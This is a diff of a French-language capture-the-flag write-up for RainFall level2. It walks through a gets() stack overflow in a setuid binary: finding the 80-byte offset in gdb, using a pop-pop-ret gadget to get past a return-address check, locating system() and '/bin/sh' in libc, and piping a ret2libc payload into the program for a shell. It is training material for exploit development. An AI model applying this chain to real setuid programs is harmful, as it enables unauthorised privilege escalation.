@@ -1,79 +1,23 @@
-Arriver sur le level2 je trouve in fichier a la racine
-
-	level2@RainFall:~$ ls -la level2
-	-rwsr-s---+ 1 level3 users 5403 Mar  6  2016 level2
-
-Celui-ci dispose du setuid et ce lanceras avec les droit de level3.
-
-	level2@RainFall:~$ file level2
-	level2: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x0b5bb6cdcf572505f066c42f7be2fde7c53dc8bc, not stripped
-
-	C'est un fichier executable 32 bits.
-
-Je vais donc décompiler le binaire avec cutter, je l'envoie sur mon linux avec scp
-
-	scp -r -P 4242 level2@10.64.1.129:/home/user/level2/level2 ./
-
-C'est un programme qui ne prend aucun argument dans l'entrée standar et qui appelle directement une fonction 'p'
-La fonction p prend une chaine dans l'entrer standar avec gets il n'y a pas de vérification de la taille du tampon donc il y a possibilité d'exploiter un buffer overflow.
-
+De nouveau un programme ne prenant aucun argument en paramètre, qui appelle une fonction p();
+Cette fonction lit l'entrée standard via un gets, on pourrait donc probablement utiliser un bufferoverflow.
+Mais nous sommes en fait bloqués par l'instruction :
 	if ((unaff_retaddr & 0xb0000000) == 0xb0000000)
 
-Est une instruction qui restreint l'utilisation des addresse de retour entre 0xb0000000 — 0xbfffffff
+,Qui restreint l'utilisation des addresse de retour entre 0xb0000000 — 0xbfffffff (qui nous empeche de réécrire une adresse sur la stack).
 
 
-Je crée un fichier temporaire avec des valeurs pour chercher la zone d'overflow
-
-	perl -e 'print "A"x70 . "BBBBCCCCDDDDEEEE"' > /tmp/exploit
-
-Je lance ensuite GDB et j'ajoute un breakpoint sur la fonction main et je run le programme avec mon fichier temporaire
-
-
-		~$ gdb level2
-		GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
-		Copyright (C) 2012 Free Software Foundation, Inc.
-		License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
-		This is free software: you are free to change and redistribute it.
-		There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
-		and "show warranty" for details.
-		This GDB was configured as "i686-linux-gnu".
-		For bug reporting instructions, please see:
-		<http://bugs.launchpad.net/gdb-linaro/>...
-		Reading symbols from /home/user/level2/level2...(no debugging symbols found)...done.
-		(gdb) b * main
-		Breakpoint 1 at 0x804853f
-		(gdb) r < /tmp/exploit
-		Starting program: /home/user/level2/level2 < /tmp/exploit
-
-		Breakpoint 1, 0x0804853f in main ()
-		(gdb) continue
-		Continuing.
-		AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADDEEAABBBBCCCCDDDDEEEE
-
-		Program received signal SIGSEGV, Segmentation fault.
-		0x45454444 in ?? ()
-
-Je voie que l'addresse réecrite indique les valeurs 4545444 (DDEE) (lecture little endian)
-Donc j'avais 70 A et ensuite il suffi de compté jusqu'a arriver a DDEE ce qui me donne une taille de 80.
-
-Je refais le même test mais avec 80 A et 4 B a la fin.
-
-	perl -e 'print "A"x80 . "BBBB"' > /tmp/exploit
-
-	level2@RainFall:~$ gdb -q level2
-	Reading symbols from /home/user/level2/level2...(no debugging symbols found)...done.
-	(gdb) b * main
-	Breakpoint 1 at 0x804853f
-	(gdb) r < /tmp/exploit
-	Starting program: /home/user/level2/level2 < /tmp/exploit
-
-	Breakpoint 1, 0x0804853f in main ()
-	(gdb) continue
-	Continuing.
-	AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBAAAAAAAAAAAABBBB
+On cherche l'offset avant l'overflow :
+	(gdb) r
+	Starting program: /home/user/level2/level2
+	AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVV
+	AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPUUUURRRRSSSSTTTTUUUUVVVV
 
 	Program received signal SIGSEGV, Segmentation fault.
-	0x42424242 in ?? ()
+	0x55555555 in ?? ()
+
+On segfault sur le U, soit un offset de 80 octets.
+
+La commande info register nous permet de confirmer la réécriture sur EIP
 	(gdb) info register
 	eax            0x804a008	134520840
 	ecx            0x0	0
@@ -83,7 +27,7 @@ Je refais le même test mais avec 80 A et 4 B a la fin.
 	ebp            0x41414141	0x41414141
 	esi            0x0	0
 	edi            0x0	0
-	eip            0x42424242	0x42424242
+	eip            0x55555555	0x55555555            <-----------   Ici
 	eflags         0x210282	[ SF IF RF ID ]
 	cs             0x73	115
 	ss             0x7b	123
@@ -92,9 +36,7 @@ Je refais le même test mais avec 80 A et 4 B a la fin.
 	fs             0x0	0
 	gs             0x33	51
 
-C'est la bonne valeur.
-
-J'ajoute un paquet a mon linux pour pouvoir lancer une analyse plus pousé
+On installe un paquet sur notre machine Kali pour récupérer l'adresse d'instructions nous intéressant (POP)
 	apt-get install metasploit-framework
 	apt install framework2
 
@@ -103,23 +45,15 @@ J'ajoute un paquet a mon linux pour pouvoir lancer une analyse plus pousé
 	0x080485f7   ebx ebp ret
 	0x080485ae   edi ebp ret
 
-Nous avons donc maintenant les 3 addresses POP, POP, RET
+Nous avons donc maintenant les 3 addresses POP, POP, RET (Les 3 auront le même effet)
 
+Il nous faut maintenant trouver les adresses des syscall system et /bin/sh, qu'on utilisera pour lancer un shell.
 
-Je vais utiliser un script qui vas me permettre d'exploiter le buffer overflow, mais avant je dois encore trouver l'addresse de la libc avec gdb et de la fonction system
-
-	level2@RainFall:~$ gdb -q level2
-	Reading symbols from /home/user/level2/level2...(no debugging symbols found)...done.
-	(gdb)  * main
-	Undefined command: "".  Try "help".
-	(gdb) b * main
-	Breakpoint 1 at 0x804853f
-	(gdb) r
-	Starting program: /home/user/level2/level2
-
-	Breakpoint 1, 0x0804853f in main ()
+Syscall system:
 	(gdb) p system
 	$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
+
+Adresse de la libc utilisée:
 	(gdb) info proc mappings
 	process 4593
 	Mapped address spaces:
@@ -128,7 +62,7 @@ Je vais utiliser un script qui vas me permettre d'exploiter le buffer overflow, 
 		0x8048000  0x8049000     0x1000        0x0 /home/user/level2/level2
 		0x8049000  0x804a000     0x1000        0x0 /home/user/level2/level2
 		0xb7e2b000 0xb7e2c000     0x1000        0x0
-		0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
+		0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so  <---- celle ci
 		0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
 		0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
 		0xb7fd2000 0xb7fd5000     0x3000        0x0
@@ -138,15 +72,15 @@ Je vais utiliser un script qui vas me permettre d'exploiter le buffer overflow, 
 		0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
 		0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
 		0xbffdf000 0xc0000000    0x21000        0x0 [stack]
+
+Adresse de /bin/sh
 	(gdb) x/s 0xb7e2c000 + 0x160c58
 	0xb7f8cc58:	 "/bin/sh"
-	(gdb) quit
-	A debugging session is active.
 
-		Inferior 1 [process 4593] will be killed.
+Nous n'avons maintenant plus qu'à assembler le tout pour appeller /bin/sh depuis l'exécutable.
 
-	Quit anyway? (y or n) y
-	level2@RainFall:~$ vim /tmp/exploit.py
+(filler du buffer + adresse du pop,pop,ret + filler pour les pop, appels system puis /bin/sh)
+
 	level2@RainFall:~$ (python /tmp/exploit.py; cat) | ./level2
 	AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�AAAAAAAAAAAA�BBBBCCCC`�淐���X��
 	whoami
